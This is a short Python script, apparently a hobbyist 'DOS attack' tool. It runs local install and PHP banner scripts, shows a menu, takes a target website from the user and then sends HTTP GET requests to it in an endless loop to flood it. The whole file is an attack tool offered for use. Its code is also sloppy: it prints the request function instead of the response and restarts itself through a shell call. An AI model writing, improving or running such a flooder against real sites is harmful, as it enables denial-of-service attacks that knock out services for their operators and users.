#inports
import requests as r 
import os
from time import sleep as s
from index import colors as i
#functions
def install():
	os.system("bash install.sh")
def title():
  os.system("php index.php")
def wait():
		x=int(1)
		y="."
		z=" "
		while x<=3:
			s(0.5)
			print(f"\r{i.green}DOS STARTING{y*x}"+z,end="")
			x+=1
def dos():
	url=input(f"{i.purple}ENTER WEBSITE=>{i.nc}")
	wait()
	print("\n")
	while True:
		page = r.get(f"https://{url}")
		print(f"{i.green}{r.get}{i.nc}")
def ppt():
	print(f"{i.blue}ENTER A VALIDE OPTION")
	s(1)
	os.system("python dos.py")
def menu():
	print(f"{i.yellow}[1] START DOS ATTACK\n{i.red}[2] EXIT PROGRAME")
def option():
	x=input(f"{i.cyan}[~] OPTION=>{i.nc}")
	if x=="1":
		dos()
	elif x=="2":
		exit()
	else:
		ppt()
def run():
	install()
	title()
	menu()
	option()
#run
run()